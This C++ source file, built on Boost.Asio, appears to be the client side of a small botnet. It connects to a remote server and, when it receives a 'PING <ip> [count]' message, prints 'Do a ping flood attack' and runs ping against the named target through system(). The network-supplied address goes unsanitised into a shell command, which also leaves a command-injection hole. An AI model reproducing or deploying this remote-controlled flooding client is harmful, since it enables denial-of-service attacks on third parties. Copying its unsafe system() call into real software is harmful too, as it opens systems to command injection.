#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <vector>

#include <boost/algorithm/string.hpp>

using boost::asio::ip::icmp;
using boost::asio::deadline_timer;
namespace posix_time = boost::posix_time;

#include "ipv4_header.hpp"
#include "icmp_header.h"

#include "Communication.h"

Communication::Communication(boost::asio::io_service& io_service, tcp::resolver::iterator endpoint_iterator) : io_service_(io_service), socket_(io_service)
{
	do_connect(endpoint_iterator);
}

void Communication::write(const Message& msg)
{
	io_service_.post([this, msg]()
	{
		bool write_in_progress = !write_msgs_.empty();
		write_msgs_.push_back(msg);
		if (!write_in_progress)
		{
			do_write();
		}
	});
}

void Communication::close()
{
	io_service_.post([this]() { socket_.close(); });
}

void Communication::ping(std::string ip, unsigned int iter)
{
	std::ostringstream stringStream;
	stringStream << "ping " << " -c " << iter << " " << ip ;
	std::string command = stringStream.str().c_str();
	std::cout << command << std::endl;
	system(command.c_str());
}

void Communication::do_connect(tcp::resolver::iterator endpoint_iterator)
{
	boost::asio::async_connect(socket_, endpoint_iterator,
		[this](boost::system::error_code ec, tcp::resolver::iterator)
		{
			if (!ec)
			{
				do_read_header();
			}
		});
}

void Communication::do_read_header()
{
	boost::asio::async_read(socket_,boost::asio::buffer(read_msg_.data(), Message::header_length),
		[this](boost::system::error_code ec, std::size_t /*length*/)
		{
			if (!ec && read_msg_.decode_header())
			{
				do_read_body();
			}
			else
			{
				socket_.close();
			}
		});
}

void Communication::do_read_body()
{
	boost::asio::async_read(socket_,boost::asio::buffer(read_msg_.body(), read_msg_.body_length()),
		[this](boost::system::error_code ec, std::size_t /*length*/)
		{
			if (!ec)
			{

				std::string str(read_msg_.body());
				boost::to_upper(str);
				std::vector < boost::iterator_range < std::string::iterator > > splitted;
				boost::split(splitted, str, boost::is_any_of(" "), boost::token_compress_on);

				if (splitted.size() >= 2 && std::string(splitted.at(0).begin(), splitted.at(0).end()).compare("PING") == 0) {
					std::cout << "Do a ping flood attack" << std::endl;
					ping(std::string(splitted.at(1).begin(), splitted.at(1).end()), (splitted.size() == 2)? 100 : atoi(std::string(splitted.at(2).begin(),splitted.at(2).end()).c_str()));
					this->close();
				}
				
				do_read_header();
			}
			else
			{
				socket_.close();
			}
		});
}

void Communication::do_write()
{
	boost::asio::async_write(socket_,boost::asio::buffer(write_msgs_.front().data(),write_msgs_.front().length()),
		[this](boost::system::error_code ec, std::size_t /*length*/)
		{
			if (!ec)
			{
				write_msgs_.pop_front();
				if (!write_msgs_.empty())
				{
					do_write();
				}
			}
			else
			{
				socket_.close();
			}
		});
}
